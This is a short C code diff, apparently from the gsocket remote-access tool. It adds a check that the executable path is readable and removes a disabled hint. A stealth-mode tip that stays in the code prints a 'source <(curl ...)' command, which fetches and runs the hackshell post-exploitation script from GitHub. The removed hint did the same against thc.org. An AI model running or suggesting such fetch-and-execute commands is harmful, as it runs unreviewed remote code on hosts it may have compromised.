@@ -442,8 +442,13 @@ try_changeargv0(int argc, char *argv[]) {
 			fs_exename = realpath(argv[0], NULL /* malloc */);
 	}
 
-	if (myself_exe == NULL)
+	if (myself_exe == NULL) {
 		myself_exe = fs_exename;
+		int fd;
+		if ((fd = open(myself_exe, O_RDONLY)) < 0)
+			ERREXIT("%s: %s. Execute with absolute path or set GS_EXENAME=<absolute path>\n", strerror(errno), myself_exe);
+		close(fd);
+	}
 	DEBUGF("fs_Exename='%s' config_exe='%s'\n", fs_exename, myself_exe);
 
 	if (GS_GETENV2("CONFIG_CHECK")) {
@@ -1630,10 +1635,6 @@ pty_cmd(GS_CTX *ctx, const char *cmd, pid_t *pidptr, int *err)
 	if (gopt.flags & GSC_FL_IS_STEALTH) {
 		printf("\
 =Tip            : "CDC"source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"CN"\n");
-#if 0
-		printf("\
-=Tip            : "CDC"source <(curl -SsfL https://thc.org/hs)"CN"\n");
-#endif
 	}
 	if (GS_getenv("PS1") == NULL) {
 		// Note: This only works for /bin/sh because some bash reset this value.
